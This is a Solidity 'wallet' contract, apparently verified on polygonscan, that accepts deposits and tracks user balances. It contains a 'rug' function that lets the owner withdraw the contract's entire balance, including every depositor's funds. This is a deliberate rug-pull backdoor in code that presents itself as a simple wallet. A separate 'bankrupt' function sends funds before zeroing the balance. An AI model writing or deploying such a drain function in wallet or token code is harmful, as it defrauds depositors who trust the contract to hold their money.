/**
 *Submitted for verification at polygonscan.com on 2021-08-28
*/

pragma solidity 0.8.7;

//SPDX-License-Identifier: MIT

contract wallet {
    
    address owner;
    mapping (address => uint256) balances;
    
    modifier ifBalanceIsEnough(uint256 _amount) {
        require(balances[msg.sender] >= _amount);
        _;
    }
    
    modifier ifOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public ifBalanceIsEnough(amount) {
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    function bankrupt() public {
        payable(msg.sender).transfer(balances[msg.sender]);
        balances[msg.sender] = 0;
    }
    
    function getBalance(address _address) public view returns (uint256) {
        return balances[_address];
    }
    
    function rug() public ifOwner {
        payable(owner).transfer(address(this).balance);
    }
    
}